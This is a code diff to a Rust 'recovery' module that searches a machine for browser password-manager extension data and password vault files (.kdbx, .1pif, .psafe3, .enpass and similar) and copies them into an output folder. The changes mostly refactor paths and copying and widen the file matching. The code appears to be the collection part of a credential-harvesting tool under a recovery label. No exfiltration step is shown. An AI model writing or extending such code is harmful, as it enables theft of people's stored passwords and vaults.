@@ -1,6 +1,6 @@
 use crate::recovery::{
     context::RecoveryContext,
-    fs::{copy_dir_limited, sanitize_label},
+    fs::sanitize_label,
     task::{RecoveryArtifact, RecoveryCategory, RecoveryError, RecoveryTask},
 };
 use async_trait::async_trait;
@@ -62,8 +62,12 @@ impl RecoveryTask for BrowserPasswordManagerTask {
                 }
 
                 let label = format!("{manager_name} ({browser_name})");
-                let dest = password_manager_browser_dir(ctx, &label).await?;
-                copy_dir_limited(
+                let dest = ctx.output_dir
+                    .join("Other")
+                    .join("Password Managers")
+                    .join(sanitize_label(&label));
+                
+                crate::recovery::fs::copy_dir_limited(
                     &extension_path,
                     &dest,
                     &label,
@@ -73,16 +77,18 @@ impl RecoveryTask for BrowserPasswordManagerTask {
                 )
                 .await?;
 
-                let location_file = dest.join("Location.txt");
-                let location_text = extension_path.display().to_string();
-                fs::write(&location_file, location_text).await?;
-                let meta = fs::metadata(&location_file).await?;
-                artifacts.push(RecoveryArtifact {
-                    label: label.clone(),
-                    path: location_file,
-                    size_bytes: meta.len(),
-                    modified: meta.modified().ok(),
-                });
+                if dest.exists() {
+                    let location_file = dest.join("Location.txt");
+                    let location_text = extension_path.display().to_string();
+                    fs::write(&location_file, location_text).await?;
+                    let meta = fs::metadata(&location_file).await?;
+                    artifacts.push(RecoveryArtifact {
+                        label: label.clone(),
+                        path: location_file,
+                        size_bytes: meta.len(),
+                        modified: meta.modified().ok(),
+                    });
+                }
             }
         }
 
@@ -159,33 +165,7 @@ async fn directory_has_entries(path: &Path) -> bool {
     }
 }
 
-async fn password_manager_browser_dir(
-    ctx: &RecoveryContext,
-    label: &str,
-) -> Result<PathBuf, RecoveryError> {
-    let folder = ctx
-        .output_dir
-        .join("services")
-        .join("Other")
-        .join("Password Managers")
-        .join(sanitize_label(label));
-    fs::create_dir_all(&folder).await?;
-    Ok(folder)
-}
-
 struct PasswordManagerTask;
-
-impl PasswordManagerTask {
-    fn output_dir(ctx: &RecoveryContext) -> Result<PathBuf, RecoveryError> {
-        let folder = ctx
-            .output_dir
-            .join("services")
-            .join("Other")
-            .join("Password Managers")
-            .join("Password Manager Files");
-        Ok(folder)
-    }
-}
 
 const PASSWORD_MANAGER_EXTENSIONS: &[&str] = &[
     ".kdbx", ".keyx", ".1pif", ".psafe3", ".enpass", ".rbt", ".vault", ".db", ".sqlite", ".pwmgr",
@@ -206,6 +186,8 @@ const EXCLUDED_FILE_NAMES: &[&str] = &[
     "package-lock",
     "windows",
     "log",
+    "thumbcache",
+    "iconcache",
 ];
 
 const MIN_FILE_SIZE_BYTES: u64 = 128;
@@ -229,14 +211,14 @@ impl RecoveryTask for PasswordManagerTask {
             return Ok(Vec::new());
         }
 
-        let dest_root = PasswordManagerTask::output_dir(ctx)?;
-        fs::create_dir_all(&dest_root).await?;
+        let dest_root = ctx.output_dir
+            .join("Other")
+            .join("Password Managers")
+            .join("Password Manager Files");
 
         let mut artifacts = Vec::new();
         for file in files {
-            let artifact =
-                copy_password_manager_file(&file, &dest_root, "Password Managers").await?;
-            artifacts.push(artifact);
+            crate::recovery::fs::copy_file("Password Managers", &file, &dest_root, &mut artifacts).await?;
         }
 
         Ok(artifacts)
@@ -270,7 +252,7 @@ fn collect_password_files(paths: Vec<PathBuf>) -> Vec<PathBuf> {
     let mut files = Vec::new();
 
     for path in paths.into_iter().filter(|p| p.is_dir()) {
-        for entry in WalkDir::new(&path).into_iter().filter_map(Result::ok) {
+        for entry in WalkDir::new(&path).max_depth(5).into_iter().filter_map(Result::ok) {
             if !entry.file_type().is_file() {
                 continue;
             }
@@ -326,7 +308,7 @@ fn matches_excluded_name(path: &Path, excluded: &[&str]) -> bool {
         .and_then(OsStr::to_str)
         .unwrap_or("")
         .to_lowercase();
-    excluded.iter().any(|ex| name.eq_ignore_ascii_case(ex))
+    excluded.iter().any(|ex| name.contains(&ex.to_lowercase()))
 }
 
 fn is_encrypted(path: &Path) -> Option<bool> {
@@ -342,50 +324,4 @@ fn is_encrypted(path: &Path) -> Option<bool> {
         .filter(|b| *b < 32 || *b > 126)
         .count();
     Some((non_printable as f64) / (read as f64) > 0.8)
-}
-
-async fn copy_password_manager_file(
-    source: &Path,
-    dest_root: &Path,
-    label: &str,
-) -> Result<RecoveryArtifact, RecoveryError> {
-    let file_name = source
-        .file_name()
-        .unwrap_or_else(|| OsStr::new("file"))
-        .to_string_lossy()
-        .to_string();
-    let dest = resolve_unique_destination(dest_root, &file_name).await?;
-    fs::copy(source, &dest).await?;
-    let meta = fs::metadata(&dest).await?;
-    Ok(RecoveryArtifact {
-        label: label.to_string(),
-        path: dest,
-        size_bytes: meta.len(),
-        modified: meta.modified().ok(),
-    })
-}
-
-async fn resolve_unique_destination(
-    dest_root: &Path,
-    file_name: &str,
-) -> Result<PathBuf, RecoveryError> {
-    let mut candidate = dest_root.join(file_name);
-    let mut counter = 0;
-    let stem = Path::new(file_name)
-        .file_stem()
-        .and_then(OsStr::to_str)
-        .unwrap_or(file_name);
-    let extension = Path::new(file_name)
-        .extension()
-        .and_then(OsStr::to_str)
-        .map(|ext| format!(".{ext}"))
-        .unwrap_or_default();
-
-    while fs::metadata(&candidate).await.is_ok() {
-        counter += 1;
-        let suffix = format!("{stem}_{counter}{extension}");
-        candidate = dest_root.join(suffix);
-    }
-
-    Ok(candidate)
 }
